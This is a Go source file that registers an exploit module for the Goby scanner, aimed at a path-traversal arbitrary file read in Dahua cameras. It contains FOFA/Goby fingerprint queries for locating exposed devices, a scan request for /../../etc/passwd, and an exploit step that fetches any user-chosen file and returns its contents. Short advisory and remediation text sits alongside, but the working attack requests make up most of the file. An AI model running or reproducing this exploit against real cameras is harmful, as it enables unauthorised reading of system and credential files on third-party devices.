package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhejiang Dahua camera arbitrary file download vulnerability",
    "Description": "<p>Zhejiang Dahua camera is a camera product developed by Zhejiang Dahua Technology Co., Ltd. due to the lax filtering of.. / etc., Zhejiang Dahua camera eventually leads to arbitrary file reading.</p>",
    "Product": "Zhejiang Dahua camera",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2022-08-26",
    "Author": "3388469307@qq.com",
    "FofaQuery": "header=\"ZheJiang Dahua Technology\"||banner=\"ZheJiang Dahua Technology\"",
    "GobyQuery": "header=\"ZheJiang Dahua Technology\"||banner=\"ZheJiang Dahua Technology\"",
    "Level": "2",
    "Impact": "<p>An attacker can arbitrarily read sensitive files of the server through this vulnerability.</p>",
    "Recommendation": "<p>1. The official has not fixed this vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2. Set the access policy and set the white list access through the firewall and other security devices.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:/:/bin/sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/../..{{{cmd}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "浙江大华摄像头任意文件下载漏洞",
            "Product": "浙江大华摄像头",
            "Description": "<p>浙江大华摄像头是浙江大华技术股份有限公司开发的一款摄像产品，<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">浙江大华摄像头由于对../等过滤不严格，最终导致任意文件读取。</span><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>浙江大华摄像头存在任意文件下载漏洞，攻击者可以通过该漏洞任意读取服务器敏感文件。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Zhejiang Dahua camera arbitrary file download vulnerability",
            "Product": "Zhejiang Dahua camera",
            "Description": "<p>Zhejiang Dahua camera is a camera product developed by Zhejiang Dahua Technology Co., Ltd. due to the lax filtering of.. / etc., Zhejiang Dahua camera eventually leads to arbitrary file reading.<br></p>",
            "Recommendation": "<p>1. The official has not fixed this vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2. Set the access policy and set the white list access through the firewall and other security devices.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>An attacker can arbitrarily read sensitive files of the server through this vulnerability.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10699"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}